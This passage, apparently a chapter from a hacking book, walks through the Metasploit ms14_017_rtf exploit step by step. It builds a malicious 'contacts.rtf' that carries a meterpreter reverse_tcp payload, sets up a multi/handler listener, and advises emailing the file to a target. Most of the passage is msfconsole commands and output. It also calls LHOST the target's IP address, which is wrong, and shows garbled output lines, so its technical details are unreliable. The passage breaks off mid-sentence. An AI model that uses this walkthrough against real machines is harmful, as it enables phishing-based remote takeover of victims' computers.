    ## Chapter 3 Hacking A Windows Computer With Metasploit


    The application of the exploits included in the Metasploit Framework is very broad.
    One of the best things about the tools in this framework is that there is always
    a way to make them complement each other. In this chapter, you will learn about
    *ms14_017_rtf* exploit and how to use it to deliver a payload to a Windows 7 computer
    to exploit a known vulnerability and hack the computer remotely.


    ### Executing A Metasploit Exploit Hack With Meterpreter


    Now that you know how exploits work on Metasploit, let us try hacking your target
    windows computer using the *ms14_017_rtf* exploit. Google this exploit to learn
    more about it.


    A few years back, a bug was discovered in Windows 7 which allowed a remote hacker
    to take control of the system remotely by simply sending the target a rich text
    file. You will just need to create and save a .rtf file exploit then send it to
    the target. When the file is opened, a meterpreter session which allows you to
    do almost anything on the target system remotely is initiated. Assuming that your
    new installation of Windows 7 is not patched, it should still have this glaring
    vulnerability.


    This chapter introduces you to another very useful and powerful hacker’s tool:
    the meterpreter. It is an advanced and dynamically extensible payload capable
    of necessitating full access to a target system.


    ### Step 1: Start the Metasploit


    There are two ways you can initialize *Metasploit* on Kali Linux on the terminal
    or via the application menu. On the Desktop, click on the menu shortcut on the
    top left corner, go to *Kali Linux > Top 10 Security Tools > Metasploit Framework*
    then choose exploit to hack computer over the internet.


    ### Step 2: Initialize the exploit


    When the Metasploit service initializes, enter the following command on its terminal
    window to initialize the exploit:


    `msf > use exploit/windows/fileformat/ms14_017_rtf`

    `msf exploit[ms14_017_rtf] >`


    If you would like to view more information about the loaded exploit, use the command
    *info*.


    ### Step 3: Set exploit options


    The next step is to check what further information or processes this exploit requires.
    Use the command show options to open a list of options that you may be required
    to set for this exploit.


    `msf > use exploit/windows/fileformat/ms14_017_rtf`

    `msf exploit(ms14_017_rtf) > show options`


    On the terminal window, a list of options will open. They include specifying the
    filename of the rtf exploit file, setting the payload, and defining the LHOST
    (target IP address).


    ### Step 4: Set a name for the exploit


    Choose any appropriate filename that the target would give to a rich text file.
    In our case, we will use ‘*contacts.rtf*’. We will use this command to assign
    the filename:


    `msf > use exploit/windows/fileformat/ms14_017_rtf`

    `msf exploit(ms14_017_rtf) > set FILENAME contacts.rtf`

    `FILENAME => contacts.rtf`

    `msf exploit(ms14_017_rtf) >`


    ### Step 5: Set the Payload


    Next, we will set the *reverse_tcp* payload for the contacts.rtf file stored under
    /windows/meterpreter/ using the *PAYLOAD* command. This is what will help us initialize
    the meterpreter session when the file is opened, enabling us to hack the target
    computer remotely even over the internet.


    `FILENAME => contacts.rtf`

    `msf exploit(ms14_017_rtf) > set PAYLOAD windows/meterpreter/reverse_tcp`

    `PAYLOAD => windows/meterpreter/reverse_tcp`

    `msf exploit(ms14_017_rtf) >`


    ### Step 6: Set the target IP address (LHOST)


    If you are using a local installation of Windows for practice, make sure that
    the network is properly configured. Find the IP address of the virtual copy of
    Windows 7 and set it as the LHOST. You can find the IP address by typing *ipconfig*
    on the command line in Windows and *iwconfig* on a Kali Linux terminal. We will
    use 192.168.10.10 in this demonstration.


    `PAYLOAD => windows/meterpreter/reverse_tcp`

    `msf exploit(ms14_017_rtf) > set LHOST 192.168.10.10`

    `LHOST => LHOST 192.168.10.10`

    `msf exploit(ms14_017_rtf) >`


    ### Step 7: Compile the exploit


    Compile the exploit using the command *exploit*.


    `msf exploit(ms14_017_rtf) > exploit`

    `[+] contacts.rtf stored at /root/.msf4/local/contacts.rtf`

    `msf exploit(ms14_017_rtf) >`


    ### Step 8: Configure a multi-handler connection of the exploit


    We have now successfully created the exploit. The next step is to configure it
    to accept connections to our computer. We will use a Multi-Handler to configure
    this connection. Here is the command to use:


    `[+] contacts.rtf stored at /root/.msf4/local/contacts.rtf`

    `msf exploit(ms14_017_rtf) > use exploit/multi/handler`

    Set the payload to use the handler using this command:


    `msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp`

    `PAYLOAD => windows/meterpreter/reverse_tcp`

    `msf exploit(handler) >`

    And finally set the LHOST, just as we did for the exploit:


    `msf exploit(handler) > set LHOST 192.168.10.10`

    `LHOST => LHOST 192.168.10.10`

    `msf exploit(handler) >`


    That is it! The last step is to send the .rtf file as an email attachment or via
    link and wait for them to open it. Because we are using a virtual system, you
    can copy this file to the Windows system and open it. When the file is opened,
